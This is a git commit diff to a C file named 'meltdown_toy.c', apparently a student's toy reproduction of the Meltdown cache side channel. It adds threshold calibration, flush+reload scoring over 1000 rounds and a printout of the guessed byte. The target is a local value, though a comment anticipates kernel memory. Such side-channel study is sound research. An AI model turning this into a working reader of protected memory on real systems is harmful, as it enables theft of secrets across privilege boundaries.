4a0fad5dcfcbcfd69705cc8d7ec1a39cd9b87b0a
kimjy0126 <kimjy0126@skku.edu>
2019-08-23 15:44:54 +0900

    Add scores

--- meltdown_toy.c
+++ meltdown_toy.c
@@ -1,7 +1,9 @@
 #define _GNU_SOURCE
 #include <stdio.h>
+#include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
+#include <math.h>
 #include <signal.h>
 #include <ucontext.h>
 #include <sys/types.h>
@@ -17,6 +19,27 @@ void my_handler(int sig, siginfo_t *siginfo, void *context)
     ucontext_t *ucontext = context;
     ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stop;
     return;
+}
+unsigned long set_threshold(void *p)
+{
+    unsigned long cached = 0, uncached = 0;
+    unsigned long cycles = 1000000;
+    double res;
+
+    for (unsigned long i = 0; i < cycles; i++)
+        cached += probe(p);
+    cached = 0;
+    for (unsigned long i = 0; i < cycles; i++)
+        cached += probe(p);
+    for (unsigned long i = 0; i < cycles; i++)
+    {
+        cf(p);
+        uncached += probe(p);
+    }
+    cached /= cycles;
+    uncached /= cycles;
+    res = sqrt((double)cached * uncached);
+    return (unsigned long)res;
 }
 static inline void func(void *p)
 {
@@ -37,33 +60,49 @@ static inline void func(void *p)
          :  "rax", "rdx", "rcx"
         );
 }
-int main(void)
+int main(int argc, char *argv[])
 {
     char arr[256 * 4096];
-    int data = 210; // just a random number
-                    // this will be kernel memory value like *0xffffffff80000000 or something
+    int data;       // this will be kernel memory value like *0xffffffff80000000 or something
     int status;
     unsigned long time[256];
+    int score[256] = {0, };
+    unsigned long threshold;
     pid_t pid;
-    int zero = 0;
 
+    if (argc == 1) data = 234;
+    else data = atoi(argv[1]);
     myact.sa_sigaction = my_handler;
     myact.sa_flags |= SA_SIGINFO;
     sigaction(SIGFPE, &myact, NULL);
     memset(arr, 0xab, sizeof(arr));
-    for (int i = 0; i < 256; i++)
+    threshold = set_threshold(arr);
+    for (int cnt = 0; cnt < 1000; cnt++)
     {
-        for (int j = 0; j < 256; j++)
+        for (int i = 0; i < 256; i++)
         {
-            cf(arr + j * 4096);
+            for (int j = 0; j < 256; j++)
+            {
+                cf(arr + j * 4096);
+            }
+            func(arr + data * 4096);
+            time[i] = probe(arr + i * 4096);
+            cf(arr + i * 4096);
         }
-        func(arr + data * 4096);
-        time[i] = probe(&arr[i * 4096]);
+        int min_idx = 0;
+        for (int i = 0; i < 256; i++)
+            if (time[min_idx] > time[i]) min_idx = i;
+        if (time[min_idx] < threshold) score[min_idx]++;
+/*        for (int i = 0; i < 256; i++)
+        {
+            printf("i = %d : %ld cycles\n", i, time[i]);
+        }
+        printf("threshold : %lu\n", threshold);*/
     }
+    int max_idx = 0;
     for (int i = 0; i < 256; i++)
-    {
-        printf("i = %d : %ld cycles\n", i, time[i]);
-    }
+        if (score[max_idx] < score[i]) max_idx = i;
+    printf("Guessed : %d (Score : %d / 1000)\n", max_idx, score[max_idx]);
     return 0;
 }
 unsigned long probe(char *adrs)
@@ -81,7 +120,6 @@ unsigned long probe(char *adrs)
          "  lfence              \n"
          "  rdtsc               \n"
          "  subl %%esi, %%eax   \n"
-         "  clflush 0(%1)       \n"
          :  "=a" (time)
          :  "c" (adrs)
          :  "esi", "edx"
